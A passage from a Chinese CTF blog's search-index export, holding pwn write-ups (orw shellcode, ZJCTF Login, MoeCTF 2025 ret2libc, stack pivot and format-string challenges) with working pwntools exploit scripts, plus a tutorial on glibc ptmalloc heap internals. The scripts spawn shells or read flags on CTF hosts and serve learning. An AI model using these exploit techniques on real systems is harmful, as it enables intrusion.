通过寄存器控制函数","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"栈迁移","slug":"栈迁移","permalink":"http://example.com/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"},{"name":"orw","slug":"orw","permalink":"http://example.com/tags/orw/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"simple_shellcode","slug":"simple-shellcode","date":"2025-08-29T12:57:56.000Z","updated":"2025-09-03T10:57:00.137Z","comments":true,"path":"2025/08/29/simple-shellcode/","permalink":"http://example.com/2025/08/29/simple-shellcode/","excerpt":"","text":"题目 MEMORY[0xCAFE0000]: 这部分表示程序正在访问内存地址 0xCAFE0000 处的内容。 (): 在 C&#x2F;C++ 等编程语言中，圆括号 () 通常表示函数调用。 合起来，这句话的意思就是：将内存地址 0xCAFE0000 中的内容视为一个函数（或一段可执行代码），并立即执行它。 该沙箱主要通过 seccomp 过滤器禁用了与执行新程序和提升权限相关的系统调用，特别是 execve 和 execveat 在main函数可以看到只能输入0x10个字符，这个长度无法构建shellcode 所以调用一个长度足够的read函数读入(12个字节) read的三个参数。rdi是文件描述符，rsi是写入位置，rdx是写入长度 rdx执行read的时候是0x10 但是当他运行到调用buf的时候，rdx的数值是buf的地址 1234xor rdi, rdi：1 字节 (\\x48\\x31\\xff)mov rsi, rdx：3 字节 (\\x48\\x89\\xd6)add rsi, 0xc：3 字节 (\\x48\\x83\\xc6\\x0c)syscall：2 字节 (\\x0f\\x05) 然后就可以对flag文件进行操作 脚本 123456789101112131415161718192021222324from pwn import *context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)#io = remote(&quot;node5.anna.nssctf.cn&quot;, 21185)io = process(&quot;./vuln&quot;)elf = ELF(&quot;./vuln&quot;)gdb.attach(io)io.recvuntil(b&quot;shellcode:\\n&quot;)read_code = &quot;&quot;&quot;xor rdi, rdimov rsi, rdxadd rsi, 0xcsyscall&quot;&quot;&quot;io.send(asm(read_code))shellcode = shellcraft.open(&#x27;./flag&#x27;)shellcode += shellcraft.read(3, 0xCAFE0000 + 0x100, 0x100)shellcode += shellcraft.write(1, 0xCAFE0000 + 0x100, 0x100)io.sendline(asm(shellcode))io.interactive()","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"orw","slug":"orw","permalink":"http://example.com/tags/orw/"},{"name":"code","slug":"code","permalink":"http://example.com/tags/code/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"[ZJCTF 2019]Login","slug":"ZJCTF-2019-Login","date":"2025-08-26T12:08:05.000Z","updated":"2025-09-03T10:57:06.053Z","comments":true,"path":"2025/08/26/ZJCTF-2019-Login/","permalink":"http://example.com/2025/08/26/ZJCTF-2019-Login/","excerpt":"","text":"题目 发现代码有点不容易分析，但是题目中存在直接的后门函数 所以题目应该不难 在check函数中 看到这个函数的参数被执行了 所以我们可以把这个参数直接替换为后门函数的地址（第一个参数存在rdi中） 因为这个函数是在main函数中被调用的 我们去main函数中找到rdi的赋值 lea rax, [rbp+var_130] 这条指令的意思就是：**计算 [rbp+var_130] 这个内存地址，然后把这个地址本身的值赋给 rax 寄存器。**符合我们后面看到的a1指针的情况 图中可以看到rdi的值应该是[rbp+var_130] 且在password_checker之后把[rbp+var_130]的值赋给rax 所以我们可以去password_checker查看其位置，目标就是找到它的相对位置 看到距离ret是0x18 main接下来会调用read_password函数（这两个都是main调用的，可以根据其相当于ret的位置去判断其实际位置） 会把栈清空，然后建它自己的的栈空间 可以看到从读入位置s到我们执行的参数位置偏移是0x48 脚本 12345678910111213141516171819from pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#p=process(&quot;./login&quot;)elf=ELF(&quot;./login&quot;)#gdb.attach(p,&quot;b*0x400B68&quot;)p=remote(&quot;node5.buuoj.cn&quot;,29403)p.recvuntil(b&quot;username:&quot;)p.sendline(b&quot;admin&quot;)#p.recvuntil(b&quot;password:&quot;)pay=b&quot;2jctf_pa5sw0rd&quot;pay=pay.ljust(0x48,b&quot;\\x00&quot;)pay+=p64(0x400E88)p.sendline(pay)p.interactive()","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"rax替代","slug":"rax替代","permalink":"http://example.com/tags/rax%E6%9B%BF%E4%BB%A3/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"heap","slug":"heap","date":"2025-08-24T10:07:08.000Z","updated":"2025-09-03T11:12:26.102Z","comments":true,"path":"2025/08/24/heap/","permalink":"http://example.com/2025/08/24/heap/","excerpt":"","text":"堆管理器ptmalloc程序运行时堆提供动态分布的内存，从而允许程序申请大小未知的内存，堆由低地址向高地址方向增长，这和栈是相反的（栈是由高地址向低地址方向生长） 每个系统都有自己的堆管理器，不同平台的堆管理器是不一样的，比如Windows、Linux、Mac的处理机制不一样，用户请求堆块和释放堆块的流程也不一样。 堆利用就是针对堆管理器的一种利用思路。它就像是中介，为了避免系统与用户频繁交互（因为和操作系统交互非常耗时），就有了堆管理器。实际上，用户平时申请（malloc）和释放（free）堆块的时候，是和堆管理器直接接触的。 ptmalloc基本功能主要负责完成用户的两个需求：malloc（申请堆块）和free（释放堆块） 在ptmalloc堆管理器中，内核一般会预先分配一块很大的连续的内存，然后让堆管理器通过某种算法管理这块内存，只有当出现堆空间不足的情况时，ptmalloc堆管理器才会再次与操作系统进行交互，通过系统调用申请内存 释放堆块的时候也是一样，ptmalloc堆管理器需要管理用户释放的堆块，会通过一系列的bin进行管理。bin在ptmalloc中用来保存没有使用的chunk（释放之后的chunk）。根据需求的不同，bin在数据结构上表现为单向链表或者双向循环链表。而且用户请求堆块的时候会优先来自这些释放的堆块 malloc和freemalloc 空间不够 &gt;返回null 参数为0 &gt;返回一个最小的chunk 参数为负&gt;申请有个很大的空间（一般不会成功，会返回null） free 参数为null&gt; 无影响 参数指向的地方已经被释放时&gt; 除非被禁用（使用 mallopt），否则当释放非常大的内存空间时，将尽可能自动触发将未使用的内存返还给系统的操作，从而减小程序占用。 内存分配背后的系统调用ptmalloc通过brk&#x2F;sbrk和mmap&#x2F;munmap这两组系统调用实现交互 brk&#x2F;sbrk 对于堆的操作，Linux操作系统提供了brk函数，glibc库提供了sbrk函数。我们可以通过增加brk的大小来向操作系统申请内存。 初始时，堆的起始地址start_brk以及堆的当前末尾brk指向同一地址。 不开启ASLR保护时，start_brk和brk会指向data&#x2F;bss段的结尾。 开启ASLR保护时，start_brk和brk也会指向同一位置，即在data&#x2F;bss段结尾后的随机偏移处。 现代操作系统每次重启时都会开启ASLR，所以堆的起始地址也是随机的 brk(): brk() 函数接受一个参数，即新的 brk 指针的 绝对地址。 可以将 brk 指针设置到任何你想要的合法位置，通常是向上移动以申请更多内存。 它的返回值为 0 表示成功，-1 表示失败。 这个函数提供的是 设置 功能。 sbrk(): * sbrk() 函数接受一个 增量 参数（increment）。 它将当前的 brk 指针 向前或向后移动 指定的字节数。 它返回移动前的 brk 指针的地址。如果返回 (void*)-1，则表示失败。 这个函数提供的是 增量 功能。 当使用 brk() 或 sbrk() 申请内存时，实际上是移动了数据段的末尾（brk 指针），从而获得更大的堆空间。 mmap&#x2F;munmap malloc会使用mmap来映射数据段，内核会为你分配一块物理内存，并将其内容初始化为 0，且mmap 默认创建的是私有映射。在这种模式下，被映射的内存区域属于调用它的进程，即使这个区域是文件映射，该进程对它的修改也不会反映到原文件中，也不会影响到其他同样映射了此文件的进程。 munmap与mmap对应，其作用是释放申请的内存 堆相关的数据结构malloc_chunk_6malloc 分配的内存被称为 chunk，它们在被释放后不会立即归还给系统，而是进入以双向链表形式组织的 bin*中。 在malloc_chunk的定义中，共有6个字段，即prev_size、size、fd、bk、fd_nextsize、bk_nextsize。 prev_size和size是两个size_t字段，而fd&#x2F;bk、fd_nextsize&#x2F;bk_nextsize都是指针字段，实际上记录了两个双向链表。 prev_size存储前一个 chunk 的大小 在 malloc_chunk结构体中，prev_size 字段位于 size&#96;字段之前 当前一个物理相邻的chunk是空闲的（free）： ptmalloc 库可以通过这个值，快速找到前一个空闲 chunk 的起始位置，从而将两个空闲 chunk 合并成一个更大的空闲 chunk，避免内存碎片 当前一个物理相邻的chunk正在使用（in use）： 前一个 chunk 的尾部是用户数据 那么，你当前 chunk 的prev_size 字段，其实位于前一个 chunk 的用户数据区内部。 此时，ptmalloc 知道前一个 chunk 是被占用的，所以它不会去读取 prev_size 这个字段。因此，这个字段的空间可以被前一个 chunk 的用户数据所占用（空间复用） size存储着当前chunk的大小，是2＊SIZE_SZ的整数倍 在32位的系统中size是8的整数倍，64位系统中是16的整数倍 用户程序申请的大小都会向上取整，比如在32位程序中，用户申请的大小为0x14，那么向上取整后为0x18。但实际上，在分配的时候，因为空间复用，所以分配0x14字节的chunk的时候，结果会和预想的不一样 把size以二进制写出来会发现后三位都是0，所以将最低的三位用于存储三个标志位，分别是A|M|P，从高位到低位， 其对应的解释如下： A (NON_MAIN_ARENA): ptmalloc 支持多线程,每个线程可以有自己的内存池,这被称为 arena,标志位表示是不是主arena。 如果 A 是 1 &gt; 这个 chunk 来自一个非主 arena 如果 A 是 0 &gt; 这个 chunk 来自主 arena M (IS_MMAPED): 表示当前 chunk 是通过 mmap 分配的，还是通过 brk 从主堆中分配的 M 是 1 &gt; 这个 chunk通过 mmap 系统调用获得的,当它被释放时，ptmalloc 不会把它放入空闲链表（bin），而是直接调用 munmap 将其归还给操作系统 M 是 0 &gt; 这个 chunk是通过 brk() 从主堆分配的 ,当它被释放时，ptmalloc 会将其放入对应的 bin 中 P (PREV_INUSE): 表示前一个物理相邻的 chunk 是否正在使用中 P 是 1 &gt; 说明前一个 chunk 正在被占用，ptmalloc 在释放当前 chunk 时，就不需要检查和合并前一个 chunk。 P 是 0 &gt; 说明前一个 chunk 是空闲的。ptmalloc 在释放当前 chunk 时，会去查看前一个 chunk，并尝试将两个空闲的 chunk 合并成一个更大的块，从而避免内存碎片 eg: 0x71，0x71&#x3D;&#x3D;0x70|0b001，表示这个chunk的大小为0x70，对应的三个标志位为：A&#x3D;0，M&#x3D;0，P&#x3D;1，即这个chunk属于主线程，不是由mmap系统调用分配，前一个物理相邻的chunk在使用中。 ❑0x105，0x105&#x3D;&#x3D;0x100|0b101，表示这个chunk的大小为0x100，对应的三个标志位为：A&#x3D;1，M&#x3D;0，P&#x3D;1，即这个chunk不属于主线程，由其他线程分配，不是由mmap系统调用分配，前一个物理相邻的chunk在使用中。 想象一下 arena 是一个内存分配的工厂。每个工厂都有自己的原材料（堆空间）和一套管理流程。 主 arena：每个进程都有且只有一个主 arena。它使用进程的主堆（main heap，通过 brk() 扩展的数据段）作为原材料。所有线程都可以从主 arena 申请内存。 非主 arena：在多线程环境中，如果多个线程同时请求内存，为了避免锁竞争，ptmalloc 会为某些线程创建新的 arena。这些新的 arena 不使用主堆，而是通过 mmap() 从操作系统获取独立的堆空间来作为自己的原材料。 让我们用一个简化的流程来描述 chunk 和 arena 的关系: 线程 A 调用 malloc() 请求 100 字节内存。 ptmalloc 检查线程 A 是否有自己的 arena。如果这是第一个线程，它会使用主 arena。 主 arena 检查自己的空闲链表（bin）。如果没有合适的chunk，它会通过 brk() 扩展自己的主堆，然后从新空间中切出 100 字节的chunk，并返回给线程 A。 线程 B 同时调用 malloc() 请求 200 字节内存。 如果此时主 arena 被线程 A 锁住，ptmalloc 会为线程 B 创建一个新的 arena。 这个新 arena 通过 mmap() 获得自己的堆空间。然后从这块新空间中分配一个 200 字节的chunk，并返回给线程 B。 总而言之，arena 就像一个独立的内存管理单元，它拥有和管理自己的堆空间，并负责分配和回收 chunk。chunk 则是 arena 管理下的最小内存单元。 fd&#x2F;bk（forward&#x2F;backward）当chunk处于分配状态（使用状态）的时候，从fd这个字段开始是用户的数据，所以如果用户程序分配的堆块大小是0x20，那么实际的开销是0x20+0x10（64位程序），多余的0x10是glibc为了维护所有的chunk而产生的开销。此时fd&#x2F;bk不使用，空间被用户数据复用 如果一个chunk处于未使用状态，那么fd&#x2F;bk就会记录相应的链表信息。当一个 chunk 被释放后，ptmalloc 会将它放入相应的空闲链表bin fd 指针会指向链表中的下一个空闲 chunk，先进入链表 bk 指针会指向链表中的上一个空闲 chunk，后进入链表 fd_nextsize&#x2F;bk_nextsizelarge_bin中存储着不同大小的chunk fd_nextsize (forward next size)：指向下一个尺寸更大的空闲 chunk bk_nextsize (backward next size)：指向上一个尺寸更小的空闲 chunk tcatch和bintcache 和 bin 都是 Glibc（GNU C Library）中 malloc 实现（称为 ptmalloc2）用于管理空闲内存块的数据结构。当你调用 free() 释放一块内存时，系统不会立即将它归还给操作系统，而是由这些结构暂时保管，以便后续的 malloc() 请求能够快速分配出去 Tcache（Thread Local Cache，线程本地缓存） 是什么？ tcache 是 每个线程独有的 一组空闲内存块链表。它是一种缓存，目的是让线程在分配和释放小内存时 无需加锁，从而极大提升多线程程序的性能。 为什么需要它？ 在多线程程序中，如果所有线程都去一个“公共仓库”（全局的 bin）里取放内存，就必须用锁来防止数据混乱。频繁的加锁解锁操作会成为性能瓶颈。 tcache 为每个线程提供了一个“私人抽屉”，大部分操作都在这个私人空间里完成，避免了去“公共仓库”竞争，所以速度极快。 工作原理： 每个线程的 tcache 包含 64 条单链表。 每条链表专门用于存放一种特定大小的内存块（例如，64位中第一条链表放 24 字节的块，第二条放 32 字节的块…以此类推，32位中最小是12递增为8） 每条链表最多缓存 7 个空闲块。 分配时 (malloc)：首先检查所需大小对应的 tcache 链表。如果链表里有块，就直接拿出来用（无锁）。 释放时 (free)：首先检查对应大小的 tcache 链表是否未满（少于7个）。如果未满，就把块放进去（无锁）。 特点总结： 线程私有：每个线程都有自己的，不共享。 无锁操作：速度快，性能高。 容量小：只有64个大小类，每条链表最多7个块。 优先级最高：malloc&#x2F;free 会优先操作 tcache。 glibc是在2.26的版本之后出现的，2.29对它进行了加固 Bin （垃圾桶 &#x2F; 回收站） 是什么？ bin 是 全局共享的 空闲内存块链表。它是堆内存管理的基础结构，所有大小的内存块最终如果没被 tcache 接收，都会由对应的 bin 来管理。你可以把它想象成公共仓库。 为什么需要它？ 它是堆管理器的核心基础设施，用于服务所有大小的内存分配请求，尤其是那些 tcache 处理不了的大块内存，或者当 tcache 已满时。 工作原理与分类：bin 不是一个单一结构，而是一个系列，根据管理策略不同分为四种： Fastbin： 特点：单链表，后进先出（LIFO），操作最快。专门用于存放非常小的内存块。 行为：同样大小的块才会放在同一个链表中。free 时会有简单的检查来防止连续的 double free。 不改变使用标志p,也就是说它无法合并（一般不合并） max_fast 是一个全局变量，它定义了最大能够被当作“快速块”处理的内存大小。它的值决定了哪些内存块在释放时会进入分配速度最快的 fastbin 结构。 Unsortedbin： 特点：双向链表。这是一个“中转站”或“大杂烩”。 行为：当释放的块较大，或者来自 tcache（当 tcache 满时），会先放到这里。分配器在找不到合适块时，会来“整理”这个bin，把里面的块要么分配出去，要么归并到正确的 smallbin 或 largebin 中。 Smallbin： 特点：双向链表，先进先出（FIFO）。存放稍大一些的小内存块。 行为：大小小于 1024 字节（默认）的块存放在这里。合并操作（见下）可以发生在这里。 Largebin： 特点：双向链表。用于存放大的内存块。 行为：一个链表中存放的是一个范围内的块大小，而不是固定大小。这些块会按大小排序，以便快速找到最合适的块。 特点总结： 全局共享：位于主分配区（main_arena），所有线程共享。 需要加锁：操作全局资源，必须加锁，性能有开销。 容量大：可以管理非常多的空闲块，没有明确的个数上限。 优先级较低：在 tcache 之后被使用。 会合并：smallbin 和 largebin 中的空闲块在可能的情况下会被合并成更大的块，以减少内存碎片。 tcache&gt;fast_bin&gt;undorted_bin&gt;bin 内存分配的步骤首先，系统会获取我们分配区的锁，如果找到没有加所的分配区，就先对改分配区上锁，如果所有都上锁了，就可以开新的分配区，有了自己的分配区后 第 1 步：转换请求大小与对齐 动作：malloc(size) 中的 size 是用户请求的字节数。分配器会将其转换为实际分配的内存块大小。 计算：chunk_size = size + metadata_size + alignment_padding metadata_size：包含存储块大小（size）和标志位（如 P, M, A）的空间，通常为 2 * sizeof(size_t)。 alignment_padding：确保最终的内存地址满足对齐要求（例如 64 位系统下 16 字节对齐）。 目的：确保所有分配的内存都正确对齐，并且有空间存放管理信息。 第 2 步：检查 Tcache（线程本地缓存） 条件：如果请求的大小在 tcache 支持的范围内（通常是 64 个大小类，每个最大约 1032 字节）。 动作： 定位到当前线程的 tcache 结构。 找到对应大小类的单链表。 如果链表非空：直接从链表头部取出（unlink）第一个 chunk，将其地址返回给用户。整个过程完全无锁，速度极快。 如果链表为空：继续后续步骤。但在从后续步骤获取到块之后，会尝试填充 tcache。 第 3 步：检查 Fastbin 条件：如果请求的大小属于 fastbin 范围（小于等于 global_max_fast，默认 128 字节）。 动作： 获取 arena 的锁（因为 fastbin 是全局的，需要同步）。 找到对应大小类的 fastbin 单链表（LIFO）。 如果链表非空：取出表头的 chunk。 Tcache Fill：检查当前线程的 tcache 对应链表是否还有空位（默认最多7个）。如果有，则尝试从 fastbin 中取出多个块（直到取完或 tcache 被填满）放入 tcache，然后返回最初取出的那个块。 如果链表为空：则继续后续步骤。 第 4 步：检查 Smallbin 条件：如果请求的大小属于 smallbin 范围（小于 1024 字节）。 动作： 找到对应大小类的 smallbin 双向链表（FIFO，每个bin中的块大小严格一致）。 如果链表非空：取出链表尾部的一个 chunk。 Tcache Fill：同样，尝试用这个大小的块填充 tcache。 如果链表为空：则继续后续步骤。 第 5 步：核心循环 - 处理 Unsorted Bin 这是最复杂的一步，是分配器的“垃圾处理厂”和“中转站”。 动作： 遍历 unsorted bin：它是一个双向链表，存放着最近被释放的、还未分类的 chunk。 检查每一个 chunk： 精确匹配？ 如果遇到一个 chunk 的大小正好等于请求的大小，则立即将其取出并返回。 是 Last Remainder？ 如果遇到 last remainder chunk 且它的大小足够大，则对其进行分割：一部分返回给用户，剩余部分成为新的 last remainder（一种优化局部性的策略）。 不匹配则分类：如果当前 chunk 既不匹配也不适合分割，就根据其大小将其从 unsorted bin 中卸下，并链入对应的 smallbin 或 largebin 中。这个过程称为 “unsorted bin 的清理”。 这个循环会一直进行，直到分配到块，或者 unsorted bin 被清空。 第 6 步：检查 Largebin 条件：如果请求的大小属于 largebin 范围（大于等于 1024 字节）。 动作：此时 unsorted bin 已被清空，分配器开始在对应的 largebin 中查找。 largebin 中的 chunk 按大小排序。 分配器使用“最佳匹配”策略，寻找一个大小大于等于请求大小的最小 chunk。 如果找到，就进行分割：一部分返回给用户，剩余部分作为新的空闲块放回 unsorted bin。 第 7 步：使用 Top Chunk（最后的挣扎） 如果以上所有步骤都找不到合适的空闲块，分配器只能求助于最后的家底——Top Chunk。 检查：判断 top chunk 的大小是否足够。 行动： 如果足够：直接从 top chunk 中切割出所需的大小，剩余部分形成新的 top chunk。 如果不足： 此时就要判断是不是在主分配区了，如果在主分配区就要调用sbrk（）去增大top chunk，如果在非住分配区就要调用mmap（）来增加top chunk大小或者直接分配，这里好药判断是否在mmap的分配阈值内，大于就会映射一段区域返回给用户。小于就要判断是否是第一次调用malloc,是第一次就先分配一块区域作为我们的heap，如果初始化过了，住分配区就brk（）增加heap的大小，非住分配区就早top chunk中切出一个chunk返回给用户 先尝试合并 fastbin 中的块（通过调用 malloc_consolidate）来扩充 top chunk。 如果还不够，则调用 sys_brk 或 sys_mmap 向操作系统申请新的内存来扩大 top chunk。 然后再从扩大后的 top chunk 中进行切割。 内存回收1.获取分配区的锁，以此保证线程安全 2.判断传入的指针是否为0，如果为0就直接返回传入。 free() 函数的指针是之前由 malloc()、calloc() 或 realloc() 分配的内存块的起始地址。这个指针至关重要，因为它告诉 free() 函数需要释放哪一块内存。free() 会利用这个地址，以及存储在内存块元数据中的信息，来确定要释放的内存块的大小，然后将其归还给内存分配器（或内核）。 3.不是0的话就判断是否为mmap分配的，是就调用munmap来释放 4.判断大小，小于max_fast,位于heap的顶端就和top chunk合并。不位于heap的顶端就放在fast_bin中，并且不改变p标志位 5.大于max_fast,判断前一个chunk是否空闲，如果是free状态就把他们合并在一起，接着判断是否与top_chunk相邻，相邻就合并 6.如果不与top_chunk合并，就判断下一个chunk是否为空闲的，是就把他们合并放在unsorted bin中，并更新合并后的chunk的大小 FASTBIN_CONSOLIDATION_THRESHOLD 是一个在 glibc 内存分配器（ptmalloc）中使用的内部阈值，用于决定何时触发**fastbin 的合并（consolidation）**操作。此时我们的chunk会被遍历并与chunk合并然后链入我们的unsortedbin中，此时fast_bin会空 此时要判断是否超过这个阈值 判断 top chunk 的大小，是否大于 mmap 的收缩阈值（即 M_TRIM_THRESHOLD，通常默认值是 128KB） 主分配区：如果合并后的 top chunk 确实大于这个阈值，glibc 会调用 brk 系统调用，将 top chunk 末尾多余的部分收缩，并将这部分内存归还给操作系统。主分配区最初由 brk 扩展而来，这部分初始内存（通常是 128KB 或更大）是不会被收缩的。只有在程序后续通过 sbrk 进一步扩展的堆内存，才可能被收缩并归还。这是一种优化，因为它避免了频繁地收缩和扩展最初的堆区域 非主分配区：当非主分配区的 top chunk 在释放时变大，并且满足收缩条件（大于 M_TRIM_THRESHOLD），它会将 top chunk 的一部分或全部还给操作系统。如果一个线程释放了所有它自己分配的内存，并且合并后的 top chunk 包含了整个非主分配区的所有内存，那么 glibc 就会调用 munmap 系统调用，将整个 sub-heap（也就是这个线程的堆）归还给操作系统。这使得其他线程或进程可以立即重用这块内存，极大地提高了多线程环境下的内存回收效率。 特殊的chunkTop Chunk（顶级块 &#x2F; 荒野块）Top Chunk 是系统已经分配给堆（通过 brk 或 mmap）但还未被 malloc 分配给用户程序的那部分空间。Top Chunk 是堆中所有已分配和空闲 chunk 的“边界”和“扩展基地”。它位于当前堆区的最高地址处。(低地址) 它是堆上最后一块也是最大的一块空闲 chunk。 它不属于任何 bin（fastbin, smallbin, unsortedbin, largebin）。 它的 size 字段记录了它自身的大小。 内存分配的最后手段：当所有的 bin（包括 unsortedbin）都无法满足一个内存分配请求时，分配器就会从 Top Chunk 中“切割”出一块来满足请求。 如果 Top Chunk 的大小足够：直接从其头部切下所需大小的内存，剩下的部分形成新的、更小的 Top Chunk。 如果 Top Chunk 的大小不足：通过 brk() 或 mmap() 系统调用向操作系统申请，扩大 Top Chunk 的大小，然后再进行切割。 堆的扩展与收缩：Top Chunk 是堆与操作系统交互的接口。堆通过调整 Top Chunk 的大小来动态增长或缩小。 整个 malloc 流程是一个精妙的性能与资源利用率之间的权衡： 常见路径（快）：size convert -&gt; tcache -&gt; fastbin -&gt; return 非常见路径（慢但高效）：smallbin -&gt; unsorted bin -&gt; largebin -&gt; return 保障路径（非常慢）：malloc_consolidate -&gt; grow heap via syscall -&gt; top chunk -&gt; return**** Last Remainder Chunk（最后剩余块）是 unsorted bin 中的一个特殊角色，它是一种优化策略，用于改善内存局部性。 它是什么？ 它是最近一次从一个大 chunk 中分割后剩余下来的那部分。 它被单独记录在 unsorted bin 中，并被打上“特殊”的标记。 它有什么用？ 场景：假设程序先申请了一块大内存（A），然后又申请了一小块内存（B），随后释放了 A。此时，A 作为一个大空闲块在 unsorted bin 中。接着，程序又申请一块和 B 大小相同的小内存。 如果没有 Last Remainder：分配器可能会从 unsorted bin 里随便找一块合适的内存进行切割，这可能发生在任何地址。 有了 Last Remainder：分配器会优先从刚才剩下的那个大块（即 Last Remainder Chunk）中进行切割。因为刚刚使用过的 B 很可能还在 CPU 缓存中，紧挨着 B 的 Last Remainder 也在缓存中的概率很高。从这个位置分配新的内存，缓存命中率更高，速度更快。 mmaped chunk 特性 普通堆块 (brk) MMaped Chunk 来源 从 Top Chunk 分割而来 直接由 mmap() 系统调用创建 位置 主堆区内 独立的内存映射区 释放行为 放入各类 bin 中缓存，延迟归还 立即 munmap()，归还操作系统 元数据标志 PREV_INUSE (P) 等 IS_MMAPPED (M) 大小 通常小于 mmap阈值（默认128KB） 通常大于等于 mmap阈值 速度 快（无系统调用） 慢（需要系统调用） 主要影响 可能造成堆碎片 保持堆整洁，但可能有地址空间碎片","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"MoeCTF 2025","slug":"MoeCTF-2025","date":"2025-08-17T13:20:10.000Z","updated":"2025-08-26T09:11:18.828Z","comments":true,"path":"2025/08/17/MoeCTF-2025/","permalink":"http://example.com/2025/08/17/MoeCTF-2025/","excerpt":"","text":"100find it（fd） dup回赋值这个文件描述符1的功能，所以在close(1)之后只能通过dup(1)复制的值3来作为输出到终端的文件描述符，会产生新的文件描述符的只有open和dup等函数 write和read是调用他 所以接下来，open()函数要产生新的小的文件描述符来指定文件位置 也就是1 所以脚本 1234567891011121314from pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#p = process(&quot;./fd&quot;)p=remote(&quot;192.168.145.1&quot;,20880)sh_shellcode = asm(shellcraft.sh())p.recvuntil(b&quot;I&#x27;ve hidden the fd of stdout. Can you find it?&quot;)p.sendline(b&quot;3&quot;)p.recvuntil(b&quot;You are right.What would you like to see?&quot;)p.sendline(b&quot;flag&quot;)p.recvuntil(b&quot;What is its fd?&quot;)p.sendline(b&quot;1&quot;)p.interactive() 认识libc 接收printf的地址，用来泄露libc地址 但是查看ROP命令查看elf的pop|ret发现不够，所以用libc文件的 基址加上偏移就可以了，所以可以正确放置参数 构造后门函数 123456789101112131415161718192021222324252627from pwn import *context.arch = &#x27;amd64&#x27;context.os = &#x27;linux&#x27;context.log_level = &#x27;debug&#x27;libc = ELF(&quot;./libc.so.6&quot;)elf = ELF(&quot;./libc&quot;)#p=process(&quot;./libc&quot;)p = remote(&quot;192.168.145.1&quot;, 26565)p.recvuntil(&quot;printf&#x27;: 0x&quot;)printf_addr_str = p.recvline().strip()printf = int(printf_addr_str, 16)log.info(&quot;Leaked printf address: &quot; + hex(printf))libc_base = printf - libc.symbols[&quot;printf&quot;]log.success(&quot;Libc base: &quot; + hex(libc_base))rdi=libc_base+0x000000000002a3e5system=libc_base+libc.symbols[&quot;system&quot;]bin=libc_base+0x1d8678p.recvuntil(b&quot;&gt;&quot;)payload = b&quot;A&quot; *72payload+=p64(rdi)+p64(bin)+p64(0x40101a)+p64(system)p.sendline(payload)p.interactive() 150ezpivot栈迁移 注意要用ret*0x100把栈地址抬高 脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python3# -*- coding: utf-8 -*-&quot;&quot;&quot;Basic PWN Template - Normal Template Author: p0ach1lDate: 2025-08-19Target: no description&quot;&quot;&quot;from pwn import *from ctypes import *from LibcSearcher import *from pwnscript import *filename = &quot;./ezpivot&quot;url = &#x27;127.0.0.1:33113&#x27;gdbscript = &#x27;&#x27;&#x27; b * 0x000000000040130B b * 0x000000000040133E&#x27;&#x27;&#x27;set_context(log_level=&#x27;debug&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, endian=&#x27;little&#x27;, timeout=5)p = pr(url=url , filename=filename , gdbscript=gdbscript , framepath=&#x27;&#x27;)elf = ELF(filename)desc = 0x0000000000404060binsh_addr = 0x404880pop_rdi = 0x0000000000401219leave_ret = 0x000000000040133Eret = 0x000000000040133Fsystem_plt = elf.plt[&#x27;system&#x27;]system_addr = 0x000000000401230p.sendlineafter(&quot;length of your introduction.\\n&quot; , b&#x27;-1&#x27;)payload = p64(ret) * 0x100 + p64(pop_rdi) + p64(0x404880) + p64(ret) + p64(system_addr) + b&quot;/bin/sh\\x00&quot;p.sendline(payload)payload = b&#x27;a&#x27; * 0xc + p64(desc - 0x8) + p64(leave_ret)p.sendlineafter(&quot;Now, please tell us your phone number:\\n&quot; , payload)p.interactive() fmt找到两个参数的位置泄露出来 脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python3# -*- coding: utf-8 -*-&quot;&quot;&quot;Basic PWN Template - Normal Template Author: p0ach1lDate: 2025-08-09Target: no description&quot;&quot;&quot;from pwn import *from ctypes import *from LibcSearcher import *from pwnscript import *filename = &quot;./pwn4&quot;url = &#x27;127.0.0.1:39821&#x27;gdbscript = &#x27;&#x27;&#x27; b * $rebase(0x0000000000001485) b * $rebase(0x00000000000014C4)&#x27;&#x27;&#x27;set_context(log_level=&#x27;debug&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, endian=&#x27;little&#x27;, timeout=5)p = pr(url=url , filename=filename , gdbscript=gdbscript , framepath=&#x27;&#x27;)elf = ELF(filename)payload = b&#x27;%7$s---%10$p----&#x27;p.sendlineafter(&quot;Hey there, little one, what&#x27;s your name?&quot; , payload)p.recvuntil(&quot;Nice to meet you,&quot;)str1 = p.recvuntil(&quot;---&quot; , drop=True)str2 = p.recvuntil(&quot;---&quot; , drop=True).decode()str2 = bytes.fromhex(str2[2:])[::-1].decode(&quot;utf-8&quot;)print(&quot;=======1111&quot; , str1)print(&quot;=======2222&quot; , str2)p.sendlineafter(&quot;I buried two treasures on the stack.Can you find them?\\n&quot; , str2)p.sendlineafter(&quot;Yeah,another one?&quot; , str1)p.interactive()","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"NewStar2024 pwn","slug":"NewStar2024-pwn","date":"2025-08-15T05:21:14.000Z","updated":"2025-09-03T10:56:22.752Z","comments":true,"path":"2025/08/15/NewStar2024-pwn/","permalink":"http://example.com/2025/08/15/NewStar2024-pwn/","excerpt":"","text":"week2Bad Asm 